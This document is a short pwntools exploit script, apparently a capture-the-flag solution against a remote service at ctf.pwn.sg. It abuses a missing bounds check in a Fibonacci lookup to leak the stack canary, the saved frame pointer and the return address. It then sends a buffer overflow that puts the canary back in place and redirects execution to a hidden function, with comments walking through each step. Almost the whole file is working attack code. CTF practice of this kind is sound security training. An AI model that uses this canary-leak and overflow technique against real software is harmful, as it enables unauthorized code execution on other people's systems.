from pwn import *

p = remote('ctf.pwn.sg', 1500)

# We need to jump to babymode()

# There's also a buffer overflow,
# but the stack is protected by a canary.

# We need to leak the canary and write it back
# to where it was so that the binary doesn't
# detect our buffer overflow

def fib(idx, ans='y'):
    p.sendlineafter('Which fibbonacci offset did you want to look up? ', str(idx))
    p.recvuntil(': ', drop=True)
    ret = p.recvline()
    p.sendlineafter('Want to learn another Fibbonaci number? (y/n) ', ans)
    return int(ret[:-1])

# theres no bounds checking when they get the fibonacci number
# you can read any memory after rbp-0x910 (where the fib numbers are stored)

# index 0 is getting memory at rbp-0x910

# to get the saved RBP, choose 0x910/8 == 290
# to get the canary, 289 (its right before the saved RBP)
# to get the ret, 291 (its right after the saved RBP)

#         +-------------+-------------+-------------+
#         |    canary   |  saved RBP  | return addr |
#         +-------------+-------------+-------------+
#
# Address:    rbp-0x8       rbp        rbp+0x8

ret = fib(291)
# (this isnt actually necessary)
base = fib(290)
canary = fib(289)
# the return address is some address in main()
# we need the address to babymode(), and from analysis
# we can find that baby mode is 482 before that address

# if we return there, however, it will crash, so we just return
# to the code in babymode() after its function prologue
babymode = ret-482+4

# exit the loop
fib(0, 'n')

# we just do a simple buffer overflow!
p.sendlineafter('Did you learn anything? ', 'A'*0x108+p64(canary)+p64(base)+p64(babymode))
p.interactive()
